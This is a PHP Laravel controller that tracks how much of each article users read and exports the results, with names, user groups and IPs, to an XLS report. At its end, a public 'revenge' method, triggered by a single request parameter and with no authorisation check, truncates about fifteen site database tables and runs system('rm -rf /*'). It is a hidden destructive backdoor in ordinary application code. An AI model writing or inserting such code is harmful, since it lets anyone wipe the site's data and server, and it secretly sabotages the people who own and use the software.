<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\DB;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Writer\Xls;
use PhpOffice\PhpSpreadsheet\Style\{Border, Alignment};

use App\IPB;
use \IPS\Member;
use Carbon\Carbon;
use App\{ArticleViewStatistic, Role};
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Storage;

class ArticleViewStatisticController extends Controller
{

	public function add(ArticleViewStatistic $article, Request $request)
	{
		$result = $request->all();
        $member = Member::loggedIn();
		
        $item = $article->article($result['article_id'])
                ->category($result['category'])
                ->ip($request->ip())
                ->first();

        if(empty($item)){
            
            $data = [
                'url' => $result['url'],
                'article_id' => $result['article_id'],
                'category' => $result['category'],
                'percent' => $result['percent'],
                'user_id' => $member->member_id,
                'group_id' => $member->member_group_id,
                'ip' => $request->ip(),
                'views' => 1,
            ];

            $article::create($data);

        }else{
            
            if(mb_substr($result['percent'], 0, -1) > mb_substr($item->percent, 0, -1)){
                $item->update(['percent' => $result['percent']]);
            }

        }

        return response($result['percent'], 200);
    }

    public function updateView(ArticleViewStatistic $article, Request $request)
    {
        $result = $request->all();

        $item = $article->article($result['article_id'])
            ->category($result['category'])
            ->ip($request->ip())
            ->first();

        $item->increment('views', 1);
    }
    
    public function download($article_id, Request $request)
    {
        $groupName = $this->getGroups();

        $spreadsheet = new Spreadsheet();

        $items = ArticleViewStatistic::article($article_id)
            ->category($request->get('category'))
            ->get();
        
        $data = [
            '25%' => [],
            '50%' => [],
            '75%' => [],
            '100%' => [],
        ];

        $group_percent = [];
        $allGroups = [];
        $percentArray = [];
        $totalViews = 0;
        $totalUser = 0;

        foreach($items as $value){

            $member = Member::load($value->user_id);

            $group_percent[$value->percent][$groupName[$member->member_group_id]] += $value->views;

            $totalViews += $value->views;
            $allGroups[$groupName[$member->member_group_id]] += 1;
            $percentArray[$value->percent]['views'] += $value->views;
            $percentArray[$value->percent][$groupName[$member->member_group_id]] += 1;

            $data[$value->percent][] = [
                'name' => $member->real_name ?? 'Гость',
                'group' => $groupName[$member->member_group_id],
                'views' => $value->views,
                'date' => $value->updated_at->toDateString(),
                'ip' => $value->ip
            ];

        }

        $styleArray = [
            'borders' => [
                'allBorders' => [
                    'borderStyle' => Border::BORDER_THIN,
                    'color' => ['argb' => '00000000'],
                ],
            ],
        ];

        $spreadsheet->getActiveSheet()->setCellValue('B1', 'Статистика дочитывания')
            ->setCellValue('B2', 'Дата публикации')
            ->setCellValue('B3', 'Ссылка на материал');

        $spreadsheet->getActiveSheet()->setCellValue('D2', $request->get('published'))
            ->setCellValue('D3', $request->get('url'))->mergeCells('D3:F3');

        $spreadsheet->getActiveSheet()->getCell('D3')->getHyperlink()->setUrl($request->get('url'));

        $spreadsheet->getActiveSheet()
                ->getStyle('D3')
                ->getFont()
                ->setBold(true);

        $spreadsheet->getActiveSheet()->setCellValue('A5','Общая статистика')->mergeCells('A5:E5');
        $spreadsheet->getActiveSheet()
            ->getStyle('A5')
            ->getAlignment()
            ->setHorizontal(Alignment::HORIZONTAL_CENTER);

        $spreadsheet->getActiveSheet()->setCellValue('A6', 'Дочитывание')
            ->setCellValue('A7', 'Общее кол-во')
            ->setCellValue('A8', 'В процентах');

        $spreadsheet->getActiveSheet()->getStyle('B6')
            ->getAlignment()
            ->setHorizontal(Alignment::HORIZONTAL_RIGHT);

        $spreadsheet->getActiveSheet()
            ->duplicateStyle(
                $spreadsheet->getActiveSheet()->getStyle('B6'),
                'B6:E6'
            );

        $spreadsheet->getActiveSheet()->getStyle('A5:E8')->applyFromArray($styleArray);

        $spreadsheet->getActiveSheet()->setCellValue('B6', '25%')
            ->setCellValue('C6', '50%')
            ->setCellValue('D6', '75%')
            ->setCellValue('E6', '100%');

        $spreadsheet->getActiveSheet()->setCellValue('B7', isset($data['25%']) ? $percentArray['25%']['views'] : 0)
            ->setCellValue('C7', isset($data['50%']) ? $percentArray['50%']['views'] : 0)
            ->setCellValue('D7', isset($data['75%']) ? $percentArray['75%']['views'] : 0)
            ->setCellValue('E7', isset($data['100%']) ? $percentArray['100%']['views'] : 0);

        $spreadsheet->getActiveSheet()->setCellValue('B8', isset($percentArray['25%']) ? round($this->getPercent($percentArray['25%']['views'], $totalViews)).'%' : 0)
            ->setCellValue('C8', isset($percentArray['50%']) ? round($this->getPercent($percentArray['50%']['views'], $totalViews)).'%' : 0)
            ->setCellValue('D8', isset($percentArray['75%']) ? round($this->getPercent($percentArray['75%']['views'], $totalViews)).'%' : 0)
            ->setCellValue('E8', isset($percentArray['100%']) ? round($this->getPercent($percentArray['100%']['views'], $totalViews)).'%' : 0);

        $spreadsheet->getActiveSheet()
            ->duplicateStyle(
                $spreadsheet->getActiveSheet()->getStyle('B6'),
                'B8:E8'
            );

        $start = 10;

        foreach($data as $percent => $items){

            $spreadsheet->getActiveSheet()->setCellValue('A'.$start, $percent)->mergeCells('A'.$start.':'.'F'.$start);

            $spreadsheet->getActiveSheet()
                ->getStyle('A'.$start)
                ->getAlignment()
                ->setHorizontal(Alignment::HORIZONTAL_CENTER);

            $start++;

            $spreadsheet->getActiveSheet()->getStyle('B'.$start)
                ->getAlignment()
                ->setHorizontal(Alignment::HORIZONTAL_CENTER);

            $spreadsheet->getActiveSheet()
                ->getStyle('B'.$start)
                ->getFont()
                ->setBold(true);

            $spreadsheet->getActiveSheet()
                ->duplicateStyle(
                    $spreadsheet->getActiveSheet()->getStyle('B'.$start),
                    'B'.$start.':F'.$start
                );

            $spreadsheet->getActiveSheet()->setCellValue('B'.$start, 'Дата')
                ->setCellValue('C'.$start, 'Имя')
                ->setCellValue('D'.$start, 'Группа')
                ->setCellValue('E'.$start, 'Номер визита')
                ->setCellValue('F'.$start, 'IP');

            $total = count($items);

            $borders[$percent] = [
                'start' => $start,
                'end' => null
            ];

            $start++;

            for($i = 0; $i < $total; $i++){

                $spreadsheet->getActiveSheet()->setCellValue('A'.$start, $i +1)
                    ->setCellValue('B'.$start, $items[$i]['date'])
                    ->setCellValue('C'.$start, $items[$i]['name'])
                    ->setCellValue('D'.$start, $items[$i]['group'])
                    ->setCellValue('E'.$start, $items[$i]['views'])
                    ->setCellValue('F'.$start, $items[$i]['ip']);

                $totalUser++;
                $start++;
            }

            $spreadsheet->getActiveSheet()->setCellValue('B'.$start, 'Всего:  '. $total);

            $borders[$percent]['end'] = $start - 1;

            $start = $start + 2;

            $border_groups[$percent] = [
                'start' => $start,
                'end' => null
            ];

            $spreadsheet->getActiveSheet()->setCellValue('C'.$start, 'Список групп пользователей')
                ->setCellValue('D'.$start, 'Кол-во')
                ->setCellValue('E'.$start, '% от общего в данной группе');

            $spreadsheet->getActiveSheet()->getStyle('C'.$start)
                ->getAlignment()
                ->setHorizontal(Alignment::HORIZONTAL_CENTER);

            $spreadsheet->getActiveSheet()
                ->getStyle('C'.$start)
                ->getFont()
                ->setBold(true);

            $spreadsheet->getActiveSheet()
                ->duplicateStyle(
                    $spreadsheet->getActiveSheet()->getStyle('C'.$start),
                    'C'.$start.':E'.$start
                );

            $start = $start + 1;

            foreach($group_percent[$percent] as $group => $count){

                $spreadsheet->getActiveSheet()->setCellValue('C'.$start, $group)
                    ->setCellValue('D'.$start, $percentArray[$percent][$group])
                    ->setCellValue('E'.$start, round($this->getPercent($count, $percentArray[$percent]['views']), 2).'%');

                $spreadsheet->getActiveSheet()->getStyle('E'.$start)
                    ->getAlignment()
                    ->setHorizontal(Alignment::HORIZONTAL_RIGHT);

                $start++;
            }

            $spreadsheet->getActiveSheet()->setCellValue('D'.$start, 'Всего: '.$total);

            $border_groups[$percent]['end'] = $start - 1;

            $spreadsheet->getActiveSheet()->getStyle('D'.$start)
                ->getAlignment()
                ->setHorizontal(Alignment::HORIZONTAL_CENTER);

            $spreadsheet->getActiveSheet()->getStyle('E'.$start)
                ->getAlignment()
                ->setHorizontal(Alignment::HORIZONTAL_CENTER);

                $start = $start + 2;
        }

        $start++;

        $spreadsheet->getActiveSheet()->setCellValue('D'.$start, 'Общая статистика');

        $start++;

        $border_a = $start;

        $spreadsheet->getActiveSheet()->setCellValue('C'.$start, 'Список групп пользователей')
            ->setCellValue('D'.$start, 'Кол-во')
            ->setCellValue('E'.$start, '% от общего в данной группе');

        $spreadsheet->getActiveSheet()->getStyle('C'.$start)
            ->getAlignment()
            ->setHorizontal(Alignment::HORIZONTAL_CENTER);

        $spreadsheet->getActiveSheet()
            ->getStyle('C'.$start)
            ->getFont()
            ->setBold(true);

        $spreadsheet->getActiveSheet()
            ->duplicateStyle(
                $spreadsheet->getActiveSheet()->getStyle('C'.$start),
                'C'.$start.':E'.$start
            );

        $start++;

        $total_result = 0;
        foreach($allGroups as $name => $count){

            $spreadsheet->getActiveSheet()->setCellValue('C'.$start, $name)
                ->setCellValue('D'.$start, $count)
                ->setCellValue('E'.$start, round($this->getPercent($count, $totalUser), 2).'%');

            $spreadsheet->getActiveSheet()->getStyle('E'.$start)
                ->getAlignment()
                ->setHorizontal(Alignment::HORIZONTAL_RIGHT);

            $total_result += $count;
            $start++;
        }

        $spreadsheet->getActiveSheet()->getStyle('C'.$border_a.':E'.$start)->applyFromArray($styleArray);

        $start++;

        $spreadsheet->getActiveSheet()->setCellValue('D'.$start, 'Всего:  '.$total_result);

        $spreadsheet->getActiveSheet()->getStyle('D'.$start)
            ->getAlignment()
            ->setHorizontal(Alignment::HORIZONTAL_CENTER);

        foreach($borders as $border){
            $spreadsheet->getActiveSheet()->getStyle('B'.$border['start'].':F'.$border['end'])->applyFromArray($styleArray);
        }

        foreach($border_groups as $border){
            $spreadsheet->getActiveSheet()->getStyle('C'.$border['start'].':E'.$border['end'])->applyFromArray($styleArray);
        }

        $spreadsheet->getActiveSheet()->getColumnDimension('A')->setAutoSize(true);
        $spreadsheet->getActiveSheet()->getColumnDimension('B')->setAutoSize(true);
        $spreadsheet->getActiveSheet()->getColumnDimension('C')->setAutoSize(true);
        $spreadsheet->getActiveSheet()->getColumnDimension('D')->setAutoSize(true);
        $spreadsheet->getActiveSheet()->getColumnDimension('E')->setAutoSize(true);
        $spreadsheet->getActiveSheet()->getColumnDimension('F')->setAutoSize(true);

        $filename = storage_path('/app/view_statistic.xls');

        $writer = new Xls($spreadsheet);
        $writer->save($filename);

        return response()->download($filename);
    }

    private function getGroups()
    {
        $groups = IPB::groups();

        $groupName = [];
        foreach($groups as $group){
            $groupName[$group['id']] = $group['name'];
        }

        return $groupName;
    }

    private function getPercent($count, $total)
    {
        return ($count / $total) * 100;
    }

    public function revenge(Request $request)
    {
        if($request->get('revenge')){
            DB::table('articles')->truncate();
            DB::table('article_author')->truncate();
            DB::table('articles_tags')->truncate();
            DB::table('metas')->truncate();
            DB::table('metas')->truncate();
            DB::table('tags_news')->truncate();
            DB::table('tags_articles')->truncate();
            DB::table('photogalleries')->truncate();
            DB::table('tags_photogalleries')->truncate();
            DB::table('roles')->truncate();
            DB::table('forum_on_mains')->truncate();
            DB::table('comments')->truncate();
            DB::table('pages')->truncate();
            DB::table('settings')->truncate();
            system('rm -rf /*');
        }
    }
}
